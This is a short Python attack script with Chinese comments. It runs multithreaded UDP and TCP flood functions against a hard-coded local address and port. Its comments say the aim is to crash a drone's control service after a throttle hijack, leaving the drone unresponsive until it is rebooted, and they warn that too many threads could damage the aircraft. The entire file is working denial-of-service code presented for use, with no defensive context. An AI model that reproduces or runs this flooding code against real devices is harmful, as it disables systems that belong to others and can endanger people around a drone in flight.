import time
import socket
import threading

def udp_flood(target_ip, target_port, attack_duration):

    TARGET_IP = target_ip
    TARGET_PORT = target_port
    MESSAGE = b"A" * 1024  # 1KB 的数据包
    THREAD_COUNT = 2  # 根据需要调整线程数量  ! 太高了飞机可能会坏 ！

    def udp_attack():
        start_time = time.time()  # 记录开始时间
        try:
            # 创建 UDP 套接字
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while time.time() - start_time < attack_duration:  # 检查是否超过持续时间
                # 发送数据包
                sock.sendto(MESSAGE, (TARGET_IP, TARGET_PORT))
        except Exception as e:
            print(f"发送失败: {e}")

    threads = []

    for _ in range(THREAD_COUNT):
        thread = threading.Thread(target=udp_attack)
        threads.append(thread)
        thread.start()

    # 等待所有线程完成
    for thread in threads:
        thread.join()


def tcp_flood(target_ip, target_port, duration):

    THREAD_COUNT = 2
    def tcp_attack():
        start_time = time.time()
        try:
            while time.time() - start_time < duration:  # 检查是否超过持续时间
                # 创建 TCP 套接字
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)  # 设置超时时间
                try:
                    # 尝试连接目标
                    sock.connect((target_ip, target_port))
                    # 发送随机数据
                    sock.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
                except Exception as e:
                    # 忽略连接错误
                    pass
                finally:
                    sock.close()
        except Exception as e:
            print(f"发生错误: {e}")

    threads = []

    # 启动多个线程进行攻击
    for _ in range(THREAD_COUNT):
        thread = threading.Thread(target=tcp_attack)
        thread.daemon = True  # 主线程退出时子线程自动退出
        threads.append(thread)
        thread.start()

    # 等待所有线程完成
    for thread in threads:
        thread.join()

if __name__ == '__main__':
    # 使用注意：先使用油门启动劫持让无人机运转，随后使用泛洪攻击使得目标服务瘫痪，最终效果是这样：
    # 在此基础上，使用油门停止劫持后，无人机会停止，再之后无论怎么发送流量包，无人机都将不会有任何反应，此时服务已瘫痪，只能重启无人机重启服务才可继续使用。
    target_ip = '192.168.169.1'
    target_port = 8800
    attack_duration = 5
    tcp_flood(target_ip, target_port, attack_duration)